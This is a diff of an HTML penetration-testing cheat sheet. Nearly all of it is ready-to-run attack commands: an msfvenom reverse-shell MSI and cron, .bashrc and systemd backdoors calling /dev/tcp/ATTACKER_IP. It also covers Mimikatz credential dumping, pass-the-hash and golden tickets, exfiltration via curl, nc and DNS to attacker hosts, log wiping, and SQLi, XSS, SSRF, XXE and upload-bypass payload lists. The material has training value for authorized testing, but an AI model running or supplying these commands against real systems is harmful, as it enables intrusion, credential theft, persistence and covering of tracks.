+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">AlwaysInstallElevated</span></div>
+<div class="tbox-b"><pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi
 msiexec /quiet /qn /i shell.msi</code></pre></div>
 </div>
 <h3>Password Hunting</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Finding Passwords</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>findstr /spin /c:"password" *.txt *.ini *.cfg *.config *.xml 2>nul
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Finding Passwords</span></div>
+<div class="tbox-b"><pre><code>findstr /spin /c:"password" *.txt *.ini *.cfg *.config *.xml 2>nul
 type C:\Windows\Panther\Unattend.xml
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword"
 netsh wlan show profile name="SSID" key=clear
@@ -7771,14 +7772,14 @@ runas /savecred /user:admin cmd.exe</code></pre></div>
 </div>
 <h3>Scheduled Tasks</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Scheduled Tasks</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>schtasks /query /fo LIST /v
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Scheduled Tasks</span></div>
+<div class="tbox-b"><pre><code>schtasks /query /fo LIST /v
 icacls "C:\path\to\task.exe"</code></pre></div>
 </div>
 <h3>Automated Tools</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Windows Privesc Tools</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>winPEASx64.exe quiet cmd searchfast
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Windows Privesc Tools</span></div>
+<div class="tbox-b"><pre><code>winPEASx64.exe quiet cmd searchfast
 # PowerUp
 powershell -ep bypass; Import-Module .\PowerUp.ps1; Invoke-AllChecks
 # Seatbelt
@@ -7851,21 +7852,21 @@ powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://
 <div class="col-b">
 <h3>SSH Key Persistence</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">SSH Persistence</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>echo "ssh-rsa AAAA... attacker_key" >> /root/.ssh/authorized_keys
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">SSH Persistence</span></div>
+<div class="tbox-b"><pre><code>echo "ssh-rsa AAAA... attacker_key" >> /root/.ssh/authorized_keys
 ssh-keygen -f backdoor -t rsa -N ""
 cat backdoor.pub | ssh target "cat >> /root/.ssh/authorized_keys"
 ssh -i backdoor root@TARGET_IP</code></pre></div>
 </div>
 <h3>Cron Persistence</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Cron Persistence</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >&amp; /dev/tcp/ATTACKER_IP/4444 0>&amp;1'") | crontab -</code></pre></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Cron Persistence</span></div>
+<div class="tbox-b"><pre><code>(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >&amp; /dev/tcp/ATTACKER_IP/4444 0>&amp;1'") | crontab -</code></pre></div>
 </div>
 <h3>Systemd Service</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Systemd</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>cat &gt; /etc/systemd/system/backdoor.service &lt;&lt; 'EOF'
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Systemd</span></div>
+<div class="tbox-b"><pre><code>cat &gt; /etc/systemd/system/backdoor.service &lt;&lt; 'EOF'
 [Unit]
 Description=System Update
 [Service]
@@ -7880,8 +7881,8 @@ systemctl enable backdoor.service &amp;&amp; systemctl start backdoor.service</c
 </div>
 <h3>Other Methods</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">More Persistence</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># .bashrc
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">More Persistence</span></div>
+<div class="tbox-b"><pre><code># .bashrc
 echo 'bash -c "bash -i >&amp; /dev/tcp/ATTACKER_IP/4444 0>&amp;1"' >> ~/.bashrc
 # /etc/rc.local
 echo '/bin/bash -c "bash -i >&amp; /dev/tcp/ATTACKER_IP/4444 0>&amp;1" &' >> /etc/rc.local
@@ -7898,20 +7899,20 @@ echo "/tmp/rootkit.so" > /etc/ld.so.preload</code></pre></div>
 <div class="col-b">
 <h3>Registry Run Keys</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Registry Persistence</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\shell.exe" /f
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Registry Persistence</span></div>
+<div class="tbox-b"><pre><code>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\shell.exe" /f
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\shell.exe" /f
 sc create Updater binpath= "C:\shell.exe" start= auto</code></pre></div>
 </div>
 <h3>Scheduled Tasks</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Task Scheduler</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>schtasks /create /tn "SystemUpdate" /tr "C:\shell.exe" /sc onlogon /ru SYSTEM /f</code></pre></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Task Scheduler</span></div>
+<div class="tbox-b"><pre><code>schtasks /create /tn "SystemUpdate" /tr "C:\shell.exe" /sc onlogon /ru SYSTEM /f</code></pre></div>
 </div>
 <h3>WMI Event Subscription</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">WMI Persistence</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">WMI Persistence</span></div>
+<div class="tbox-b"><pre><code>$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
     Name="SystemFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"
     Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9"
 }
@@ -7922,8 +7923,8 @@ Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding 
 </div>
 <h3>Startup Folder</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Startup</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>copy C:\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"</code></pre></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Startup</span></div>
+<div class="tbox-b"><pre><code>copy C:\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"</code></pre></div>
 </div>
 </div></div>
 
@@ -7933,8 +7934,8 @@ Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding 
 <div class="col-b">
 <h3>Mimikatz</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Mimikatz</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sekurlsa::logonpasswords
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Mimikatz</span></div>
+<div class="tbox-b"><pre><code>sekurlsa::logonpasswords
 sekurlsa::msv / sekurlsa::wdigest
 sekurlsa::tickets /export
 lsadump::dcsync /user:krbtgt
@@ -7942,20 +7943,20 @@ lsadump::sam</code></pre></div>
 </div>
 <h3>LaZagne</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">LaZagne</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>python3 laZagne.py all
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">LaZagne</span></div>
+<div class="tbox-b"><pre><code>python3 laZagne.py all
 python3 laZagne.py browsers / mails / wifi / databases / windows</code></pre></div>
 </div>
 <h3>Browser Credentials</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Browser Creds</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>SharpChrome.exe logins
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Browser Creds</span></div>
+<div class="tbox-b"><pre><code>SharpChrome.exe logins
 find / -name "logins.json" -o -name "Login Data" 2>/dev/null</code></pre></div>
 </div>
 <h3>DPAPI</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">DPAPI Extraction</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>SharpDPAPI.exe triage
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">DPAPI Extraction</span></div>
+<div class="tbox-b"><pre><code>SharpDPAPI.exe triage
 SharpDPAPI.exe credentials /server:dc.target.local</code></pre></div>
 </div>
 </div></div>
@@ -7966,8 +7967,8 @@ SharpDPAPI.exe credentials /server:dc.target.local</code></pre></div>
 <div class="col-b">
 <h3>Pass-the-Hash</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">PtH</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sekurlsa::pth /user:Administrator /ntlm:HASH /domain:target.local /run:cmd.exe
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">PtH</span></div>
+<div class="tbox-b"><pre><code>sekurlsa::pth /user:Administrator /ntlm:HASH /domain:target.local /run:cmd.exe
 psexec.py -hashes aad3b435b51404ee:da76f...
 wmiexec.py -hashes aad3b435b51404ee:da76f...
 nxc smb 10.10.10.10 -u Administrator -H HASH --shares
@@ -7975,8 +7976,8 @@ evil-winrm -i 10.10.10.10 -u Administrator -H HASH</code></pre></div>
 </div>
 <h3>Pass-the-Ticket</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">PtT</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sekurlsa::tickets /export
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">PtT</span></div>
+<div class="tbox-b"><pre><code>sekurlsa::tickets /export
 kerberos::ptt ticket.kirbi
 getTGT.py target.local/user -hashes :HASH
 export KRB5CCNAME=user.ccache
@@ -7990,16 +7991,16 @@ psexec.py -k -no-pass target.local</code></pre></div>
 <div class="col-b">
 <h3>Kerberoasting</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Kerberoasting</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>GetUserSPNs.py target.local/user:password -dc-ip DC_IP -request
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Kerberoasting</span></div>
+<div class="tbox-b"><pre><code>GetUserSPNs.py target.local/user:password -dc-ip DC_IP -request
 .\Rubeus.exe kerberoast /outfile:hashes.txt
 nxc ldap 10.10.10.10 -u user -p pass --kerberoast output.txt
 hashcat -m 13100 -a 0 hashes.txt rockyou.txt</code></pre></div>
 </div>
 <h3>AS-REP Roasting</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">AS-REP</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>GetNPUsers.py target.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">AS-REP</span></div>
+<div class="tbox-b"><pre><code>GetNPUsers.py target.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat
 .\Rubeus.exe asreproast /outfile:asrep.txt
 hashcat -m 18200 -a 0 asrep.txt rockyou.txt</code></pre></div>
 </div>
@@ -8011,8 +8012,8 @@ hashcat -m 18200 -a 0 asrep.txt rockyou.txt</code></pre></div>
 <div class="col-b">
 <h3>Golden Ticket</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Golden Ticket</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Requires: krbtgt NTLM hash, Domain SID
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Golden Ticket</span></div>
+<div class="tbox-b"><pre><code># Requires: krbtgt NTLM hash, Domain SID
 lsadump::dcsync /user:krbtgt
 kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain target.local Administrator
@@ -8021,8 +8022,8 @@ psexec.py -k -no-pass target.local</code></pre></div>
 </div>
 <h3>Silver Ticket</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Silver Ticket</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Requires: Service account NTLM hash, Domain SID
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Silver Ticket</span></div>
+<div class="tbox-b"><pre><code># Requires: Service account NTLM hash, Domain SID
 kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /target:server.target.local /service:cifs /rc4:HASH /ptt
 ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain target.local -spn cifs/server.target.local Administrator</code></pre></div>
 </div>
@@ -8034,8 +8035,8 @@ ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain target.local -
 <div class="col-b">
 <h3>Remote Execution</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Remote Execution</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>psexec.py target.local/user:password@10.10.10.20
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Remote Execution</span></div>
+<div class="tbox-b"><pre><code>psexec.py target.local/user:password@10.10.10.20
 wmiexec.py target.local/user:password@10.10.10.20
 smbexec.py target.local/user:password@10.10.10.20
 evil-winrm -i 10.10.10.20 -u user -p pass
@@ -8043,8 +8044,8 @@ dcomexec.py target.local/user:password@10.10.10.20</code></pre></div>
 </div>
 <h3>SSH Pivoting</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">SSH Pivoting</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>ssh -L 8080:internal_host:8080 user@pivot
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">SSH Pivoting</span></div>
+<div class="tbox-b"><pre><code>ssh -L 8080:internal_host:8080 user@pivot
 ssh -D 1080 user@pivot
 sshuttle -r user@pivot 10.10.10.0/24
 echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
@@ -8052,8 +8053,8 @@ proxychains nmap -sT 10.10.20.0/24</code></pre></div>
 </div>
 <h3>Chisel</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Chisel Tunnel</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Server (attacker)
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Chisel Tunnel</span></div>
+<div class="tbox-b"><pre><code># Server (attacker)
 chisel server --reverse -p 8080
 # Client (target)
 chisel client ATTACKER_IP:8080 R:socks
@@ -8061,8 +8062,8 @@ chisel client ATTACKER_IP:8080 R:socks
 </div>
 <h3>Ligolo-ng</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Ligolo-ng</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sudo ip tuntap add user $(whoami) mode tun ligolo
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Ligolo-ng</span></div>
+<div class="tbox-b"><pre><code>sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert
 # Agent (target)
@@ -8077,16 +8078,16 @@ sudo ip route add 10.10.20.0/24 dev ligolo</code></pre></div>
 <div class="col-b">
 <h3>Exfiltration</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Exfiltration</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>cat /etc/passwd | base64 | curl -X POST -d @- http://ATTACKER_IP/exfil
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Exfiltration</span></div>
+<div class="tbox-b"><pre><code>cat /etc/passwd | base64 | curl -X POST -d @- http://ATTACKER_IP/exfil
 cat secret.txt | xxd -p -c 1 | while read hex; do nslookup $hex.attacker.com; done
 scp -r user@target:/data/* ./loot/
 tar czf - /data | base64 | nc ATTACKER_IP 4444</code></pre></div>
 </div>
 <h3>Covering Tracks</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Cover Tracks</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Linux
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Cover Tracks</span></div>
+<div class="tbox-b"><pre><code># Linux
 echo "" > /var/log/auth.log /var/log/syslog /var/log/wtmp
 history -c; unset HISTFILE
 shred -vfz -n 5 /tmp/evidence
@@ -8107,8 +8108,8 @@ Enumerate no-preauth users &#8594; AS-REP roast &#8594; Crack &#8594; Lateral mo
 <div class="ib i"><div class="bt">Chain 3: ACL Abuse</div>
 BloodHound writable ACLs &#8594; Modify permissions &#8594; DCSync &#8594; Golden Ticket</div>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Full Chain Example</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># 1. Recon
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Full Chain Example</span></div>
+<div class="tbox-b"><pre><code># 1. Recon
 bloodhound-python -u user -p pass -d target.local -c All
 # 2. Get initial access
 crackmapexec smb 10.10.10.0/24 -u user -p pass
@@ -8184,8 +8185,8 @@ A01:Broken Access &#8212; A02:Cryptographic Failures &#8212; A03:Injection &#821
 </table>
 <h3>Manual Testing</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">SQLi Payloads</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Basic test
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">SQLi Payloads</span></div>
+<div class="tbox-b"><pre><code># Basic test
 ' OR 1=1 --
 ' OR '1'='1
 " OR 1=1 --
@@ -8222,8 +8223,8 @@ admin' #
 </div>
 <h3>SQLMap Exploitation</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">SQLMap</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sqlmap -u "http://target.com/page?id=1" --dbs --batch
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">SQLMap</span></div>
+<div class="tbox-b"><pre><code>sqlmap -u "http://target.com/page?id=1" --dbs --batch
 sqlmap -u "http://target.com/page?id=1" -D dbname --tables
 sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
 sqlmap -u "http://target.com/page?id=1" --os-shell
@@ -8247,8 +8248,8 @@ sqlmap -u "http://api.target.com/users" --method=POST --data='{"user":"admin","p
 </table>
 <h3>Basic Payloads</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">XSS Payloads</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Basic alert
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">XSS Payloads</span></div>
+<div class="tbox-b"><pre><code># Basic alert
 &lt;script&gt;alert(1)&lt;/script&gt;
 &lt;script&gt;alert(document.domain)&lt;/script&gt;
 
@@ -8286,8 +8287,8 @@ sqlmap -u "http://api.target.com/users" --method=POST --data='{"user":"admin","p
 </div>
 <h3>Filter Evasion</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Evasion</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Case variation
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Evasion</span></div>
+<div class="tbox-b"><pre><code># Case variation
 &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
 
 # Double encoding
@@ -8315,8 +8316,8 @@ data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code></pre></div>
 </div>
 <h3>CSP Bypass</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">CSP Bypass</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># If CSP allows unsafe-inline - no bypass needed
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">CSP Bypass</span></div>
+<div class="tbox-b"><pre><code># If CSP allows unsafe-inline - no bypass needed
 # If CSP uses nonce - try to find XSS in a page with valid nonce
 # If CSP allows a CDN domain - try XSS on that CDN
 # If CSP uses base-uri - inject &lt;base href="http://attacker"&gt;
@@ -8334,8 +8335,8 @@ data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code></pre></div>
 An attacker tricks a logged-in user's browser into making an unwanted request to a vulnerable application. The browser automatically sends cookies, making the request appear legitimate.</div>
 <h3>Exploitation</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">CSRF PoC</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>&lt;!-- Auto-submit form --&gt;
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">CSRF PoC</span></div>
+<div class="tbox-b"><pre><code>&lt;!-- Auto-submit form --&gt;
 &lt;html&gt;
 &lt;body&gt;
 &lt;form action="http://target.com/change-email" method="POST"&gt;
@@ -8360,8 +8361,8 @@ fetch('http://target.com/api/change-email', {
 </div>
 <h3>Bypass Techniques</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">CSRF Bypasses</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Change Content-Type
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">CSRF Bypasses</span></div>
+<div class="tbox-b"><pre><code># Change Content-Type
 Content-Type: text/plain
 
 # Remove anti-CSRF token from request
@@ -8379,8 +8380,8 @@ Content-Type: text/plain
 <div class="col-b">
 <h3>Basic SSRF</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">SSRF Payloads</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Internal network scanning
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">SSRF Payloads</span></div>
+<div class="tbox-b"><pre><code># Internal network scanning
 http://127.0.0.1
 http://localhost
 http://[::1]
@@ -8409,8 +8410,8 @@ http://[0000::1]</code></pre></div>
 </div>
 <h3>Cloud Metadata Attacks</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Cloud Metadata</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># AWS (IMDSv1)
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Cloud Metadata</span></div>
+<div class="tbox-b"><pre><code># AWS (IMDSv1)
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
@@ -8439,8 +8440,8 @@ http://169.254.169.254/metadata/v1/id</code></pre></div>
 <div class="col-b">
 <h3>Basic XXE</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">XXE Payloads</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">XXE Payloads</span></div>
+<div class="tbox-b"><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE foo [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
 ]&gt;
@@ -8470,8 +8471,8 @@ http://169.254.169.254/metadata/v1/id</code></pre></div>
 </div>
 <h3>XXE via Upload</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">XXE Upload</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># SVG file with XXE
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">XXE Upload</span></div>
+<div class="tbox-b"><pre><code># SVG file with XXE
 &lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE svg [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
@@ -8489,8 +8490,8 @@ http://169.254.169.254/metadata/v1/id</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">File Upload Bypass</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Upload Bypass</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Extension bypass
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Upload Bypass</span></div>
+<div class="tbox-b"><pre><code># Extension bypass
 shell.php, shell.php5, shell.phtml, shell.pht
 shell.php.jpg, shell.php%00.jpg
 shell.PHP, shell.PhP, shell.pHp
@@ -8529,8 +8530,8 @@ shell.php%00.jpg
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">LFI / RFI / Path Traversal</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">LFI Payloads</span></div>
